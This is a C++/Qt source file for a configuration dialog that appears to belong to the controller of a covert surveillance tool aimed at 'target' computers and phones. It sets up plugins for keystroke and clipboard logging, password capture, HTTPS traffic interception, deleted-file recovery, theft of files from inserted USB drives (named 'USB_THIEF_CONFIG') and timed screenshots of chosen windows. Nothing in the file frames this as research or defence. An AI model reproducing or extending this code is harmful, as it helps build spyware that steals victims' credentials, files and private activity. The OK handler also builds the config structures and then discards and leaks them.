#include "policydlg.h"

#include "adkprecomp.h"
#include "adkmemory.h"

#include "Utility.h"

#include "target.h"

PolicyDlg::PolicyDlg(QWidget *parent, Target* tar, int pluginNumber)
	: QDialog(parent)
	, tarBlock(tar)
{
	ui.setupUi(this);

	this->setWindowFlags(Qt::Dialog | Qt::WindowTitleHint);
	ui.grpHttps->hide();

	// 读取默认策略
	GetOldPolicy();

	if ( SYSTEM_MACOSX == GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		// MAC
		ui.tabWidget->removeTab(0);
	}
	else if ( SYSTEM_IOS == GetSystemType(this->tarBlock->dwOsBuildNumber)
		|| SYSTEM_ANDROID == GetSystemType(this->tarBlock->dwOsBuildNumber))
	{
		// IOS
		ui.tabWidget->removeTab(0);
		ui.grpUsb->hide();
		ui.edtWindowTitle->hide();
		ui.lbKeyword->hide();
		ui.tabWidget->setTabText(0, QString::fromLocal8Bit("屏幕监控插件"));
	}

	if ( pluginNumber == 4 
		&& SYSTEM_WINDOWS == tarBlock->m_sysType )
		ui.tabWidget->setCurrentIndex(1);

	connect(ui.btnOk, SIGNAL(clicked()), this, SLOT(OnOk()));
	connect(ui.btnCancel, SIGNAL(clicked()), this, SLOT(reject()));
	connect(ui.chkSmartCapture, SIGNAL(clicked()), this, SLOT(OnChkSmartCaptureClicked()));
}

PolicyDlg::~PolicyDlg()
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取用户行为插件配置信息
//
bool PolicyDlg::GetUserActionCfgInfo(PUSER_ACT_CFG& lpUserActCfgData)
{
	if ( lpUserActCfgData )
	{
		AdkFree(lpUserActCfgData);
		lpUserActCfgData = NULL;
	}

	DWORD   dwFetch = 0;

	if ( ui.chkFileOp->isChecked() )
	{
		dwFetch |= USER_ACT_FILE_OP;
	}

	if ( ui.chkKeyboardOp->isChecked() )
	{
		dwFetch |= USER_ACT_KEYBOARD;
	}

	if ( ui.chkClipboardOp->isChecked() )
	{
		dwFetch |= USER_ACT_CLIPBOARD;
	}

	if ( ui.chkProcessOp->isChecked() )
	{
		dwFetch |= USER_ACT_PROC_TRACE;
	}

	if ( ui.chkExecuteOp->isChecked() )
	{
		dwFetch |= USER_ACT_PROC_FILE;
	}

	if ( ui.grpHttps->isChecked() )
	{
		if ( ui.chkHttpsSend->isChecked() )
		{
			dwFetch |= USER_ACT_HTTPS_SEND;
		}

		if ( ui.chkHttpsReceive->isChecked() )
		{
			dwFetch |= USER_ACT_HTTPS_RECV;
		}
	}

	std::wstring  wideKey;
	DWORD       dwKeyLen = 0;
	std::wstring  wideDelFilter;
	DWORD       dwDelFilterLen = 0;

	if ( ui.grpPassword->isChecked() )
	{
		if ( ui.chkEA_PASSWORD->isChecked() )
		{
			dwFetch |= USER_ACT_EA_PASSWD;
		}

		if ( ui.chkKeyword->isChecked() )
		{
			wideKey = ui.edtKeyword->text().toStdWString();
			if (wideKey.length() > 0)
			{
				dwKeyLen = wideKey.length() * sizeof(WCHAR) + 2;            
				dwFetch |= USER_ACT_PASSWD_KEYMATCH;
			}
			else
			{
				ui.chkKeyword->setChecked(false);
			}
		}
	}

	if ( ui.grpDeleteFile->isChecked() )
	{
		wideDelFilter = ui.edtDeleteFileExt->text().toStdWString();
		if (wideDelFilter.length() > 0)
		{
			dwDelFilterLen = wideDelFilter.length() * sizeof(WCHAR) + 2;
		}
		else
		{
			ui.grpDeleteFile->setChecked(false);
		}
	}

	DWORD dwSize = sizeof(USER_ACT_CFG) + dwKeyLen + dwDelFilterLen;

	PBYTE   lpbyData;
	lpUserActCfgData = (PUSER_ACT_CFG)AdkMalloc(dwSize);

	lpUserActCfgData->dwSize = dwSize;
	lpUserActCfgData->dwFetch = dwFetch;

	lpUserActCfgData->dwKeyListLength = dwKeyLen;

	if (dwKeyLen > 0)
	{
		lpUserActCfgData->dwKeyListOffset = sizeof(USER_ACT_CFG);
		lpbyData = (PBYTE)lpUserActCfgData + lpUserActCfgData->dwKeyListOffset;
		CopyMemory(lpbyData, wideKey.c_str(), dwKeyLen);
		lpUserActCfgData->lpwzKeyList = (PWCHAR)lpbyData;
	}

	lpUserActCfgData->dwMaxDelFile = 50 * 1024*1024;  // 50M @@TODO: 以后要开放给用户
	lpUserActCfgData->bGetDelFile = ui.grpDeleteFile->isChecked();

	if (lpUserActCfgData->bGetDelFile)
	{
		lpUserActCfgData->dwGetDelFileLength = dwDelFilterLen;
		if (dwDelFilterLen > 0)
		{
			lpUserActCfgData->dwGetDelFileOffset = sizeof(USER_ACT_CFG) + lpUserActCfgData->dwKeyListLength;
			lpbyData = (PBYTE)lpUserActCfgData + lpUserActCfgData->dwGetDelFileOffset;
			CopyMemory(lpbyData, wideDelFilter.c_str(), dwDelFilterLen);
			lpUserActCfgData->lpwzGetDelFileType = (PWCHAR)lpbyData;
		}
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取 usb 配置信息
//
bool PolicyDlg::GetUsbCfgInfo(PUSB_THIEF_CONFIG& lpUsbThiefCfgData)
{
	if ( lpUsbThiefCfgData)
	{
		AdkFree(lpUsbThiefCfgData);
		lpUsbThiefCfgData = NULL;
	}

	DWORD       dwSize = sizeof(USB_THIEF_CONFIG);
	DWORD       dwMaxFileSize = 0;
	DWORD       dwExtFilterLen = 0;
	std::wstring  wideFilter;

	if ( ui.chkUsbFileRetrieve->isChecked() )
	{
		wideFilter = ui.edtUsbExt->text().toStdWString();

		if ( wideFilter.length() == 0 )
		{
			MessageBoxA((HWND)winId(), "USB文件扩展名过滤条件不能为空", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}

		dwExtFilterLen = wideFilter.length() * 2 + 2;

		dwMaxFileSize = ui.spnUsbFileSize->value();
	}

	lpUsbThiefCfgData = (PUSB_THIEF_CONFIG)AdkMalloc(dwSize + dwExtFilterLen);
	lpUsbThiefCfgData->dwSize = dwSize + dwExtFilterLen;
	lpUsbThiefCfgData->bGetDir = ui.chkUsbDir->isChecked();
	lpUsbThiefCfgData->bGetFile = ui.chkUsbFileRetrieve->isChecked();
	lpUsbThiefCfgData->dwFilterSize = dwMaxFileSize * 1024 * 1024;
	lpUsbThiefCfgData->dwSizeOfType = dwExtFilterLen;

	if (dwExtFilterLen > 0)
	{
		wcscpy( lpUsbThiefCfgData->wzFilterType, wideFilter.c_str());
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取截屏配置信息
//
bool PolicyDlg::GetScreenshotCfgInfo(PCAPTURE_CONFIG& lpCaptureCfgData)
{

	DWORD dwWindowsInternal = 0;

	if ( ui.chkSmartCapture->isChecked() )
	{
		if (( ui.edtProcName->text().length() == 0 )
			&& ( ui.edtWindowTitle->text().length() == 0 ))
		{
			MessageBoxA((HWND)winId(), "\"智能截取目标窗口\"必须至少提供一个过滤条件", "提示", MB_OK | MB_ICONINFORMATION);
			return false;        
		}

		dwWindowsInternal = ui.spnInterval->value();

		if ( dwWindowsInternal < 15)
		{
			MessageBoxA((HWND)winId(), "\"窗口截取间隔\"必须大于15秒", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}
	}

	DWORD      dwKeyListLen = 0;
	DWORD      dwProcListLen = 0;
	std::wstring wideKeyList;
	std::wstring wideProcList;

	if ( ui.chkSmartCapture->isChecked() )
	{
		wideKeyList = ui.edtWindowTitle->text().toStdWString();
		if (wideKeyList.length() > 0)
		{
			dwKeyListLen = wideKeyList.length()* sizeof(WCHAR) + 2;
		}

		wideProcList = ui.edtProcName->text().toStdWString();
		if (wideProcList.length() > 0)
		{
			dwProcListLen = wideProcList.length()* sizeof(WCHAR) + 2;
		}
	}

	DWORD dwSize = sizeof(CAPTURE_CONFIG) + dwKeyListLen + dwProcListLen;

	lpCaptureCfgData = (PCAPTURE_CONFIG)AdkMalloc(dwSize);

	lpCaptureCfgData->dwSize = dwSize;
	lpCaptureCfgData->bCapWindow = ui.chkSmartCapture->isChecked();

	if ( lpCaptureCfgData->bCapWindow )
	{
		lpCaptureCfgData->dwWindowInterval = dwWindowsInternal;      // 默认20秒
		lpCaptureCfgData->dwKeyListLength = dwKeyListLen;
		lpCaptureCfgData->dwProcessListLength = dwProcListLen;

		PBYTE lpbyData = NULL;

		if (dwKeyListLen > 0)
		{
			lpCaptureCfgData->dwKeyListOffset = sizeof(CAPTURE_CONFIG);
			lpbyData = (PBYTE)lpCaptureCfgData + sizeof(CAPTURE_CONFIG);
			CopyMemory(lpbyData, wideKeyList.c_str(), dwKeyListLen);
		}

		if (dwProcListLen > 0)
		{
			lpCaptureCfgData->dwProcessListOffset = sizeof(CAPTURE_CONFIG) + lpCaptureCfgData->dwKeyListLength;
			lpbyData = (PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwProcessListOffset;
			CopyMemory(lpbyData, wideProcList.c_str(), dwProcListLen);
		}
	}

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 确定更新
//
void PolicyDlg::OnOk()
{
	PUSER_ACT_CFG lpUserActCfgData = NULL;
	PUSB_THIEF_CONFIG lpUsbThiefCfgData = NULL;
	PCAPTURE_CONFIG lpCaptureCfgData = NULL;

	if ( GetUserActionCfgInfo(lpUserActCfgData) 
		&& GetUsbCfgInfo(lpUsbThiefCfgData)
		&& GetScreenshotCfgInfo(lpCaptureCfgData) )
	{
		accept();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 读取原来的策略
//
void PolicyDlg::GetOldPolicy()
{
	//
	// 插件 2
	//
	if ( NULL != this->tarBlock->pluginVect[2] )
	{
		PUSER_ACT_CFG lpUserActCfgData  = (PUSER_ACT_CFG)tarBlock->pluginVect[2]->lpbyData;
		
		if ( lpUserActCfgData )
		{
			if (lpUserActCfgData->dwFetch & USER_ACT_FILE_OP)
			{
				ui.chkFileOp->setChecked(true);
			}
			else
			{
				ui.chkFileOp->setChecked(false);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_KEYBOARD)
			{
				ui.chkKeyboardOp->setChecked(true);
			}
			else
			{
				ui.chkKeyboardOp->setChecked(false);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_CLIPBOARD)
			{
				ui.chkClipboardOp->setChecked(true);
			}
			else
			{
				ui.chkClipboardOp->setChecked(false);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_PROC_TRACE)
			{
				ui.chkProcessOp->setChecked(true);
			}
			else
			{
				ui.chkProcessOp->setChecked(false);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_PROC_FILE)
			{
				ui.chkExecuteOp->setChecked(true);
			}
			else
			{
				ui.chkExecuteOp->setChecked(false);
			}

			ui.grpPassword->setChecked(false);
			ui.chkEA_PASSWORD->setChecked(false);
			ui.chkKeyword->setChecked(false);

			if (lpUserActCfgData->dwFetch & USER_ACT_EA_PASSWD)
			{
				ui.grpPassword->setChecked(true);
				ui.chkEA_PASSWORD->setChecked(true);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_PASSWD_KEYMATCH)
			{
				if (lpUserActCfgData->dwKeyListLength > 0)
				{
					ui.grpPassword->setChecked(true);
					ui.chkKeyword->setChecked(true);
					ui.edtKeyword->setText(
						QString::fromStdWString((PWCHAR)((PBYTE)lpUserActCfgData + lpUserActCfgData->dwKeyListOffset))
						);
				}
			}                       
			
			ui.grpHttps->setChecked(false);
			ui.chkHttpsSend->setChecked(false);
			ui.chkHttpsReceive->setChecked(false);

			if (lpUserActCfgData->dwFetch & USER_ACT_HTTPS_SEND)
			{
				ui.grpHttps->setChecked(true);
				ui.chkHttpsSend->setChecked(true);
			}

			if (lpUserActCfgData->dwFetch & USER_ACT_HTTPS_RECV)
			{
				ui.grpHttps->setChecked(true);
				ui.chkHttpsReceive->setChecked(true);
			}

			ui.grpDeleteFile->setChecked(false);
			ui.edtDeleteFileExt->setText("");

			if (lpUserActCfgData->bGetDelFile)
			{
				if (lpUserActCfgData->dwGetDelFileLength > 0)
				{
					if (lpUserActCfgData->dwGetDelFileLength > 0)
					{
						ui.grpDeleteFile->setChecked(true);
						ui.edtDeleteFileExt->setText(
							QString::fromStdWString((PWCHAR)((PBYTE)lpUserActCfgData + lpUserActCfgData->dwGetDelFileOffset))
							);
					}
				}
			}
		}
	}

	//
	// 插件 3
	//

	if ( NULL != this->tarBlock->pluginVect[3] )
	{
		PUSB_THIEF_CONFIG lpUsbThiefCfgData  = (PUSB_THIEF_CONFIG)tarBlock->pluginVect[3]->lpbyData;

		if ( lpUsbThiefCfgData )
		{
			ui.chkUsbPlug->setChecked(lpUsbThiefCfgData->bGetDir);
			ui.chkUsbFileRetrieve->setChecked(lpUsbThiefCfgData->bGetFile);

			if ( ui.chkUsbFileRetrieve->isChecked() )
			{
				ui.spnUsbFileSize->setValue(lpUsbThiefCfgData->dwFilterSize/(1024*1024));
				ui.edtUsbExt->setText(QString::fromStdWString(lpUsbThiefCfgData->wzFilterType));
			}
		}

	}

	//
	// 插件 4
	//

	if ( NULL != this->tarBlock->pluginVect[4] )
	{
		PCAPTURE_CONFIG lpCaptureCfgData  = (PCAPTURE_CONFIG)tarBlock->pluginVect[4]->lpbyData;

		if ( lpCaptureCfgData )
		{
			ui.chkSmartCapture->setChecked(lpCaptureCfgData->bCapWindow);

			if ( ui.chkSmartCapture->isChecked() )
			{
				if (lpCaptureCfgData->dwKeyListLength > 0)
				{
					ui.edtWindowTitle->setText(
						QString::fromStdWString((PWCHAR)((PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwKeyListOffset))
						);
				}
				else
				{
					ui.edtWindowTitle->setText("");
				}

				if ( lpCaptureCfgData->dwProcessListLength > 0 )
				{
					ui.edtProcName->setText(
						QString::fromStdWString((PWCHAR)((PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwProcessListOffset))
						);
				}
				else
				{
					ui.edtProcName->setText("");
				}

				ui.spnInterval->setValue(lpCaptureCfgData->dwWindowInterval);
			}
		}
	}
}

void PolicyDlg::OnChkSmartCaptureClicked()
{
	if ( ui.chkSmartCapture->isChecked() )
	{
		ui.lbProcess->setEnabled(true);
		ui.lbKeyword->setEnabled(true);
		ui.lbInterval->setEnabled(true);
		ui.lbSecond->setEnabled(true);
		ui.edtProcName->setEnabled(true);
		ui.edtWindowTitle->setEnabled(true);
		ui.spnInterval->setEnabled(true);
	}
	else
	{
		ui.lbProcess->setEnabled(false);
		ui.lbKeyword->setEnabled(false);
		ui.lbInterval->setEnabled(false);
		ui.lbSecond->setEnabled(false);
		ui.edtProcName->setEnabled(false);
		ui.edtWindowTitle->setEnabled(false);
		ui.spnInterval->setEnabled(false);
	}
}
